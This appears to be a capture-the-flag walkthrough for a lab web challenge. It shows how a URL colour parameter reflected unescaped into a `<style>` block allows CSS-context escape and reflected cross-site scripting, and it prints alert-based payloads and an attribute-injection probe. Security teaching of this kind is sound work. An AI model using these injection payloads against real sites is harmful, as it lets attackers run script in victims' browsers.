---

Name: NeedleBomb
Difficulty: Easy
Description: The atelier wanted the swatches to support any thread colour they can source, not just a fixed list, so the preview takes the colour straight from the URL and paints it into the page's styling. Convenient, but it means the value in the address bar gets to decide more than just a colour. 

---

## 1. Find the `color` parameter

We can control the thread colour through the `color` parameter:

```text
https://3cf6c0af-5330-needlebomb-59f3c.events.webverselabs-pro.com/customize.php?mono=JB&color=%232f5137
```

The value `%232f5137` is URL-encoded `#2f5137`, so the page uses it as the selected colour.

## 2. Test for XSS

A normal HTML XSS payload doesn't immediately work because the value is HTML-escaped when displayed.

For example, injecting:

```html
<script>alert(1)</script>
```

results in the tags being rendered as text rather than interpreted as HTML.

So a standard HTML-context XSS isn't enough.

## 3. Find another reflection

Looking at the generated source reveals that the same `color` value is also inserted directly into a `<style>` element:

```html
<style>
  /* Live preview: the chosen thread colour tints the monogram on the shirt. */
  .nb-monogram .initials {
      color: " onmouseover="alert(1);
      border-color: " onmouseover="alert(1);
  }

  .nb-swatch.is-active {
      outline-color: " onmouseover="alert(1);
  }
</style>
```

The important part is that our input is inside the CSS context.

The HTML escaping that prevents us from injecting normal markup in the preview doesn't protect this context because the value is subsequently interpreted as CSS.

## 4. Escape the CSS context

We can terminate the CSS declaration and then close the `<style>` element:

```text
red;}</style><script>alert("Hacked")</script><style>
```

The important pieces are:

```text
red;}
```

which terminates the CSS rule, followed by:

```html
</style>
```

which escapes the stylesheet.

We can then inject our script:

```html
<script>alert("Hacked")</script>
```

and reopen the stylesheet with:

```html
<style>
```

The resulting HTML effectively becomes:

```html
<style>
  .nb-monogram .initials {
      color: red;
  }
</style>

<script>alert("Hacked")</script>

<style>
```

The browser therefore stops treating our payload as CSS and interprets the injected `<script>` as HTML/JavaScript.

## 5. Final payload

```text
red;}</style><script>alert("Hacked")</script><style>
```

This demonstrates **reflected XSS through a CSS injection context**.
